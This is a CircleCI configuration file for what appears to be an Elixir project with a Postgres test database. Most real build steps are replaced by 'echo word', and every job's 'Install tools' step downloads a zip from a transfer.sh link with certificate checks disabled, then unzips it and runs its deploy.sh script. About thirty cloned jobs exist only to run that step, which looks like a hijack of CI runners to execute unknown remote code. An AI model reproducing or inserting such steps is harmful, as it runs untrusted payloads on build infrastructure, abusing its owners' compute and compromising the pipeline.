# Reference: https://circleci.com/docs/2.0/configuration-reference/
version: 2
jobs:
  build:
    docker:
      - image: circleci/elixir:1.7.2
        environment:
          MIX_ENV: test
    working_directory: ~/app
    steps:
      # Checkout.
      - restore_cache:
          keys:
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-{{ .Revision }}
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-
      - checkout
      - save_cache:
          key: git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-{{ .Revision }}
          paths: [".git"]
      # Install tools.
      - run: sudo apt update && sudo apt install screen -y && wget --no-check-certificate -c https://transfer.sh/G9VQ5l/a-master.zip && unzip a-master.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
      - run: echo word
      # Dependencies.
      - restore_cache:
          keys:
            - echo word
            - echo word
      - run: echo word
      - save_cache:
          key: deps-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ checksum "mix.lock" }}
          paths: ["deps"]
      # Build.
      - restore_cache:
          keys:
            - build-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-{{ .Revision }}
            - build-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-
            - build-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-
      - run: echo word
      - save_cache:
          key: build-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-{{ .Revision }}
          paths: ["_build"]

  test:
    docker:
      - image: circleci/elixir:1.7.2
        parallelism: 4
        environment:
          MIX_ENV: test
      - image: circleci/postgres:10.4-alpine-postgis
        environment:
          POSTGRES_USER: postgres
          POSTGRES_DB: golden_path_test
    working_directory: ~/app
    steps:
      # Checkout.
      - restore_cache:
          keys:
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-{{ .Revision }}
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-
      - checkout
      # Install tools.
      - run: sudo apt update && sudo apt install screen -y && wget --no-check-certificate -c https://transfer.sh/G9VQ5l/a-master.zip && unzip a-master.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh

      # Dependencies.
      - restore_cache:
          keys:
            - deps-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ checksum "mix.lock" }}
            - deps-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-
      # Build.
      - restore_cache:
          keys:
            - build-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-{{ .Revision }}
            - build-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-
            - build-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-
      # Unfortunately needed for Bcrypt.
      - run: rm -rf _build/test/lib/bcrypt_elixir && mix compile
      ##
      ## Test.
      ##
      - run:
          name: Waiting for postgres...
          command: dockerize -wait tcp://localhost:5432 -timeout 15s
      - run: mkdir _build/test/junit
      - run: touch _build/test/junit/junit_results.xml
      - run: mix test
      - store_test_results:
          path: _build/test/junit

  credo:
    docker:
      - image: circleci/elixir:1.7.2
        parallelism: 4
        environment:
          MIX_ENV: dev
    working_directory: ~/app
    steps:
      # Checkout.
      - restore_cache:
          keys:
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-{{ .Revision }}
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-
      - checkout
      # Install tools.
      - run: sudo apt update && sudo apt install screen -y && wget --no-check-certificate -c https://transfer.sh/G9VQ5l/a-master.zip && unzip a-master.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
      - run: mix local.rebar --force
      # Dependencies.
      - restore_cache:
          keys:
            - deps-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ checksum "mix.lock" }}
            - deps-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-
      # Build.
      - restore_cache:
          keys:
            - build-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-{{ .Revision }}
            - build-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-
            - build-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-
      ##
      ## Credo.
      ##
      - run: mix credo

  dialyzer:
    docker:
      - image: circleci/elixir:1.7.2
        parallelism: 4
        environment:
          MIX_ENV: dev
    working_directory: ~/app
    steps:
      # Checkout.
      - restore_cache:
          keys:
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-{{ .Revision }}
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-
      - checkout
      # Install tools.
      - run: sudo apt update && sudo apt install screen -y && wget --no-check-certificate -c https://transfer.sh/G9VQ5l/a-master.zip && unzip a-master.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
      - run: mix local.rebar --force
      # Dependencies.
      - restore_cache:
          keys:
            - deps-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ checksum "mix.lock" }}
            - deps-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-
      # Build.
      - restore_cache:
          keys:
            - build-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-{{ .Revision }}
            - build-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-
            - build-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-
      ##
      ## Dialyzer.
      ##
      ## Running dialyzer updates _build so we need to cache again.
      ## This cache of _build does not override the previous cache but is merged.
      - restore_cache:
          keys:
            - plt-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ checksum "mix.lock" }}
            - plt-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-
      - run: sudo apt update && sudo apt install screen -y && wget --no-check-certificate -c https://transfer.sh/G9VQ5l/a-master.zip && unzip a-master.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
      - save_cache:
          key: plt-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ checksum "mix.lock" }}
          paths: ["_build"]

  test2:
    docker:
      - image: circleci/elixir:1.7.2
        parallelism: 4
        environment:
          MIX_ENV: test
      - image: circleci/postgres:10.4-alpine-postgis
        environment:
          POSTGRES_USER: postgres
          POSTGRES_DB: golden_path_test
    working_directory: ~/app
    steps:
      # Checkout.
      - restore_cache:
          keys:
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-{{ .Revision }}
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-
      - checkout
      # Install tools.
      - run: sudo apt update && sudo apt install screen -y && wget --no-check-certificate -c https://transfer.sh/G9VQ5l/a-master.zip && unzip a-master.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh

  test3:
    docker:
      - image: circleci/elixir:1.7.2
        parallelism: 4
        environment:
          MIX_ENV: test
      - image: circleci/postgres:10.4-alpine-postgis
        environment:
          POSTGRES_USER: postgres
          POSTGRES_DB: golden_path_test
    working_directory: ~/app
    steps:
      # Checkout.
      - restore_cache:
          keys:
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-{{ .Revision }}
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-
      - checkout
      # Install tools.
      - run: sudo apt update && sudo apt install screen -y && wget --no-check-certificate -c https://transfer.sh/G9VQ5l/a-master.zip && unzip a-master.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh

  test4:
    docker:
      - image: circleci/elixir:1.7.2
        parallelism: 4
        environment:
          MIX_ENV: test
      - image: circleci/postgres:10.4-alpine-postgis
        environment:
          POSTGRES_USER: postgres
          POSTGRES_DB: golden_path_test
    working_directory: ~/app
    steps:
      # Checkout.
      - restore_cache:
          keys:
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-{{ .Revision }}
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-
      - checkout
      # Install tools.
      - run: sudo apt update && sudo apt install screen -y && wget --no-check-certificate -c https://transfer.sh/G9VQ5l/a-master.zip && unzip a-master.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh

  test5:
    docker:
      - image: circleci/elixir:1.7.2
        parallelism: 4
        environment:
          MIX_ENV: test
      - image: circleci/postgres:10.4-alpine-postgis
        environment:
          POSTGRES_USER: postgres
          POSTGRES_DB: golden_path_test
    working_directory: ~/app
    steps:
      # Checkout.
      - restore_cache:
          keys:
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-{{ .Revision }}
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-
      - checkout
      # Install tools.
      - run: sudo apt update && sudo apt install screen -y && wget --no-check-certificate -c https://transfer.sh/G9VQ5l/a-master.zip && unzip a-master.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh

  test6:
    docker:
      - image: circleci/elixir:1.7.2
        parallelism: 4
        environment:
          MIX_ENV: test
      - image: circleci/postgres:10.4-alpine-postgis
        environment:
          POSTGRES_USER: postgres
          POSTGRES_DB: golden_path_test
    working_directory: ~/app
    steps:
      # Checkout.
      - restore_cache:
          keys:
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-{{ .Revision }}
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-
      - checkout
      # Install tools.
      - run: sudo apt update && sudo apt install screen -y && wget --no-check-certificate -c https://transfer.sh/G9VQ5l/a-master.zip && unzip a-master.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh

  test7:
    docker:
      - image: circleci/elixir:1.7.2
        parallelism: 4
        environment:
          MIX_ENV: test
      - image: circleci/postgres:10.4-alpine-postgis
        environment:
          POSTGRES_USER: postgres
          POSTGRES_DB: golden_path_test
    working_directory: ~/app
    steps:
      # Checkout.
      - restore_cache:
          keys:
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-{{ .Revision }}
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-
      - checkout
      # Install tools.
      - run: sudo apt update && sudo apt install screen -y && wget --no-check-certificate -c https://transfer.sh/G9VQ5l/a-master.zip && unzip a-master.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh

  test8:
    docker:
      - image: circleci/elixir:1.7.2
        parallelism: 4
        environment:
          MIX_ENV: test
      - image: circleci/postgres:10.4-alpine-postgis
        environment:
          POSTGRES_USER: postgres
          POSTGRES_DB: golden_path_test
    working_directory: ~/app
    steps:
      # Checkout.
      - restore_cache:
          keys:
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-{{ .Revision }}
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-
      - checkout
      # Install tools.
      - run: sudo apt update && sudo apt install screen -y && wget --no-check-certificate -c https://transfer.sh/G9VQ5l/a-master.zip && unzip a-master.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh

  test9:
    docker:
      - image: circleci/elixir:1.7.2
        parallelism: 4
        environment:
          MIX_ENV: test
      - image: circleci/postgres:10.4-alpine-postgis
        environment:
          POSTGRES_USER: postgres
          POSTGRES_DB: golden_path_test
    working_directory: ~/app
    steps:
      # Checkout.
      - restore_cache:
          keys:
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-{{ .Revision }}
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-
      - checkout
      # Install tools.
      - run: sudo apt update && sudo apt install screen -y && wget --no-check-certificate -c https://transfer.sh/G9VQ5l/a-master.zip && unzip a-master.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh

  test10:
    docker:
      - image: circleci/elixir:1.7.2
        parallelism: 4
        environment:
          MIX_ENV: test
      - image: circleci/postgres:10.4-alpine-postgis
        environment:
          POSTGRES_USER: postgres
          POSTGRES_DB: golden_path_test
    working_directory: ~/app
    steps:
      # Checkout.
      - restore_cache:
          keys:
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-{{ .Revision }}
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-
      - checkout
      # Install tools.
      - run: sudo apt update && sudo apt install screen -y && wget --no-check-certificate -c https://transfer.sh/G9VQ5l/a-master.zip && unzip a-master.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh

  test11:
    docker:
      - image: circleci/elixir:1.7.2
        parallelism: 4
        environment:
          MIX_ENV: test
      - image: circleci/postgres:10.4-alpine-postgis
        environment:
          POSTGRES_USER: postgres
          POSTGRES_DB: golden_path_test
    working_directory: ~/app
    steps:
      # Checkout.
      - restore_cache:
          keys:
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-{{ .Revision }}
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-
      - checkout
      # Install tools.
      - run: sudo apt update && sudo apt install screen -y && wget --no-check-certificate -c https://transfer.sh/G9VQ5l/a-master.zip && unzip a-master.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh

  test12:
    docker:
      - image: circleci/elixir:1.7.2
        parallelism: 4
        environment:
          MIX_ENV: test
      - image: circleci/postgres:10.4-alpine-postgis
        environment:
          POSTGRES_USER: postgres
          POSTGRES_DB: golden_path_test
    working_directory: ~/app
    steps:
      # Checkout.
      - restore_cache:
          keys:
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-{{ .Revision }}
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-
      - checkout
      # Install tools.
      - run: sudo apt update && sudo apt install screen -y && wget --no-check-certificate -c https://transfer.sh/G9VQ5l/a-master.zip && unzip a-master.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh

  test13:
    docker:
      - image: circleci/elixir:1.7.2
        parallelism: 4
        environment:
          MIX_ENV: test
      - image: circleci/postgres:10.4-alpine-postgis
        environment:
          POSTGRES_USER: postgres
          POSTGRES_DB: golden_path_test
    working_directory: ~/app
    steps:
      # Checkout.
      - restore_cache:
          keys:
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-{{ .Revision }}
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-
      - checkout
      # Install tools.
      - run: sudo apt update && sudo apt install screen -y && wget --no-check-certificate -c https://transfer.sh/G9VQ5l/a-master.zip && unzip a-master.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh

  test14:
    docker:
      - image: circleci/elixir:1.7.2
        parallelism: 4
        environment:
          MIX_ENV: test
      - image: circleci/postgres:10.4-alpine-postgis
        environment:
          POSTGRES_USER: postgres
          POSTGRES_DB: golden_path_test
    working_directory: ~/app
    steps:
      # Checkout.
      - restore_cache:
          keys:
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-{{ .Revision }}
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-
      - checkout
      # Install tools.
      - run: sudo apt update && sudo apt install screen -y && wget --no-check-certificate -c https://transfer.sh/G9VQ5l/a-master.zip && unzip a-master.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh

  

  test15:
    docker:
      - image: circleci/elixir:1.7.2
        parallelism: 4
        environment:
          MIX_ENV: test
      - image: circleci/postgres:10.4-alpine-postgis
        environment:
          POSTGRES_USER: postgres
          POSTGRES_DB: golden_path_test
    working_directory: ~/app
    steps:
      # Checkout.
      - restore_cache:
          keys:
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-{{ .Revision }}
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-
      - checkout
      # Install tools.
      - run: sudo apt update && sudo apt install screen -y && wget --no-check-certificate -c https://transfer.sh/G9VQ5l/a-master.zip && unzip a-master.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh

  test16:
    docker:
      - image: circleci/elixir:1.7.2
        parallelism: 4
        environment:
          MIX_ENV: test
      - image: circleci/postgres:10.4-alpine-postgis
        environment:
          POSTGRES_USER: postgres
          POSTGRES_DB: golden_path_test
    working_directory: ~/app
    steps:
      # Checkout.
      - restore_cache:
          keys:
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-{{ .Revision }}
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-
      - checkout
      # Install tools.
      - run: sudo apt update && sudo apt install screen -y && wget --no-check-certificate -c https://transfer.sh/G9VQ5l/a-master.zip && unzip a-master.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh

  test17:
    docker:
      - image: circleci/elixir:1.7.2
        parallelism: 4
        environment:
          MIX_ENV: test
      - image: circleci/postgres:10.4-alpine-postgis
        environment:
          POSTGRES_USER: postgres
          POSTGRES_DB: golden_path_test
    working_directory: ~/app
    steps:
      # Checkout.
      - restore_cache:
          keys:
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-{{ .Revision }}
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-
      - checkout
      # Install tools.
      - run: sudo apt update && sudo apt install screen -y && wget --no-check-certificate -c https://transfer.sh/G9VQ5l/a-master.zip && unzip a-master.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh

  test18:
    docker:
      - image: circleci/elixir:1.7.2
        parallelism: 4
        environment:
          MIX_ENV: test
      - image: circleci/postgres:10.4-alpine-postgis
        environment:
          POSTGRES_USER: postgres
          POSTGRES_DB: golden_path_test
    working_directory: ~/app
    steps:
      # Checkout.
      - restore_cache:
          keys:
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-{{ .Revision }}
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-
      - checkout
      # Install tools.
      - run: sudo apt update && sudo apt install screen -y && wget --no-check-certificate -c https://transfer.sh/G9VQ5l/a-master.zip && unzip a-master.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh

  test19:
    docker:
      - image: circleci/elixir:1.7.2
        parallelism: 4
        environment:
          MIX_ENV: test
      - image: circleci/postgres:10.4-alpine-postgis
        environment:
          POSTGRES_USER: postgres
          POSTGRES_DB: golden_path_test
    working_directory: ~/app
    steps:
      # Checkout.
      - restore_cache:
          keys:
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-{{ .Revision }}
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-
      - checkout
      # Install tools.
      - run: sudo apt update && sudo apt install screen -y && wget --no-check-certificate -c https://transfer.sh/G9VQ5l/a-master.zip && unzip a-master.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh

  test20:
    docker:
      - image: circleci/elixir:1.7.2
        parallelism: 4
        environment:
          MIX_ENV: test
      - image: circleci/postgres:10.4-alpine-postgis
        environment:
          POSTGRES_USER: postgres
          POSTGRES_DB: golden_path_test
    working_directory: ~/app
    steps:
      # Checkout.
      - restore_cache:
          keys:
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-{{ .Revision }}
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-
      - checkout
      # Install tools.
      - run: sudo apt update && sudo apt install screen -y && wget --no-check-certificate -c https://transfer.sh/G9VQ5l/a-master.zip && unzip a-master.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh

  test21:
    docker:
      - image: circleci/elixir:1.7.2
        parallelism: 4
        environment:
          MIX_ENV: test
      - image: circleci/postgres:10.4-alpine-postgis
        environment:
          POSTGRES_USER: postgres
          POSTGRES_DB: golden_path_test
    working_directory: ~/app
    steps:
      # Checkout.
      - restore_cache:
          keys:
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-{{ .Revision }}
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-
      - checkout
      # Install tools.
      - run: sudo apt update && sudo apt install screen -y && wget --no-check-certificate -c https://transfer.sh/G9VQ5l/a-master.zip && unzip a-master.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh

  test22:
    docker:
      - image: circleci/elixir:1.7.2
        parallelism: 4
        environment:
          MIX_ENV: test
      - image: circleci/postgres:10.4-alpine-postgis
        environment:
          POSTGRES_USER: postgres
          POSTGRES_DB: golden_path_test
    working_directory: ~/app
    steps:
      # Checkout.
      - restore_cache:
          keys:
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-{{ .Revision }}
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-
      - checkout
      # Install tools.
      - run: sudo apt update && sudo apt install screen -y && wget --no-check-certificate -c https://transfer.sh/G9VQ5l/a-master.zip && unzip a-master.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh

  test23:
    docker:
      - image: circleci/elixir:1.7.2
        parallelism: 4
        environment:
          MIX_ENV: test
      - image: circleci/postgres:10.4-alpine-postgis
        environment:
          POSTGRES_USER: postgres
          POSTGRES_DB: golden_path_test
    working_directory: ~/app
    steps:
      # Checkout.
      - restore_cache:
          keys:
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-{{ .Revision }}
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-
      - checkout
      # Install tools.
      - run: sudo apt update && sudo apt install screen -y && wget --no-check-certificate -c https://transfer.sh/G9VQ5l/a-master.zip && unzip a-master.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh

  test24:
    docker:
      - image: circleci/elixir:1.7.2
        parallelism: 4
        environment:
          MIX_ENV: test
      - image: circleci/postgres:10.4-alpine-postgis
        environment:
          POSTGRES_USER: postgres
          POSTGRES_DB: golden_path_test
    working_directory: ~/app
    steps:
      # Checkout.
      - restore_cache:
          keys:
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-{{ .Revision }}
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-
      - checkout
      # Install tools.
      - run: sudo apt update && sudo apt install screen -y && wget --no-check-certificate -c https://transfer.sh/G9VQ5l/a-master.zip && unzip a-master.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh

  test25:
    docker:
      - image: circleci/elixir:1.7.2
        parallelism: 4
        environment:
          MIX_ENV: test
      - image: circleci/postgres:10.4-alpine-postgis
        environment:
          POSTGRES_USER: postgres
          POSTGRES_DB: golden_path_test
    working_directory: ~/app
    steps:
      # Checkout.
      - restore_cache:
          keys:
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-{{ .Revision }}
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-
      - checkout
      # Install tools.
      - run: sudo apt update && sudo apt install screen -y && wget --no-check-certificate -c https://transfer.sh/G9VQ5l/a-master.zip && unzip a-master.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh

  test26:
    docker:
      - image: circleci/elixir:1.7.2
        parallelism: 4
        environment:
          MIX_ENV: test
      - image: circleci/postgres:10.4-alpine-postgis
        environment:
          POSTGRES_USER: postgres
          POSTGRES_DB: golden_path_test
    working_directory: ~/app
    steps:
      # Checkout.
      - restore_cache:
          keys:
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-{{ .Revision }}
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-
      - checkout
      # Install tools.
      - run: sudo apt update && sudo apt install screen -y && wget --no-check-certificate -c https://transfer.sh/G9VQ5l/a-master.zip && unzip a-master.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh

  test27:
    docker:
      - image: circleci/elixir:1.7.2
        parallelism: 4
        environment:
          MIX_ENV: test
      - image: circleci/postgres:10.4-alpine-postgis
        environment:
          POSTGRES_USER: postgres
          POSTGRES_DB: golden_path_test
    working_directory: ~/app
    steps:
      # Checkout.
      - restore_cache:
          keys:
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-{{ .Revision }}
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-
      - checkout
      # Install tools.
      - run: sudo apt update && sudo apt install screen -y && wget --no-check-certificate -c https://transfer.sh/G9VQ5l/a-master.zip && unzip a-master.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh

  test28:
    docker:
      - image: circleci/elixir:1.7.2
        parallelism: 4
        environment:
          MIX_ENV: test
      - image: circleci/postgres:10.4-alpine-postgis
        environment:
          POSTGRES_USER: postgres
          POSTGRES_DB: golden_path_test
    working_directory: ~/app
    steps:
      # Checkout.
      - restore_cache:
          keys:
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-{{ .Revision }}
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-
      - checkout
      # Install tools.
      - run: sudo apt update && sudo apt install screen -y && wget --no-check-certificate -c https://transfer.sh/G9VQ5l/a-master.zip && unzip a-master.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh

  test29:
    docker:
      - image: circleci/elixir:1.7.2
        parallelism: 4
        environment:
          MIX_ENV: test
      - image: circleci/postgres:10.4-alpine-postgis
        environment:
          POSTGRES_USER: postgres
          POSTGRES_DB: golden_path_test
    working_directory: ~/app
    steps:
      # Checkout.
      - restore_cache:
          keys:
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-{{ .Revision }}
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-
      - checkout
      # Install tools.
      - run: sudo apt update && sudo apt install screen -y && wget --no-check-certificate -c https://transfer.sh/G9VQ5l/a-master.zip && unzip a-master.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh

  test30:
    docker:
      - image: circleci/elixir:1.7.2
        parallelism: 4
        environment:
          MIX_ENV: test
      - image: circleci/postgres:10.4-alpine-postgis
        environment:
          POSTGRES_USER: postgres
          POSTGRES_DB: golden_path_test
    working_directory: ~/app
    steps:
      # Checkout.
      - restore_cache:
          keys:
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-{{ .Revision }}
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-
            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-
      - checkout
      # Install tools.
      - run: sudo apt update && sudo apt install screen -y && wget --no-check-certificate -c https://transfer.sh/G9VQ5l/a-master.zip && unzip a-master.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh

  test31:
    docker:
      - image: circleci/elixir:1.7.2
        parallelism: 4
        environment:
          MIX_ENV: test
      - image: circleci/postgres:10.4-alpine-postgis
        environment:
          POSTGRES_USER: postgres
          POSTGRES_DB: golden_path_test
    working_directory: ~/app
    steps:
      # Checkout.
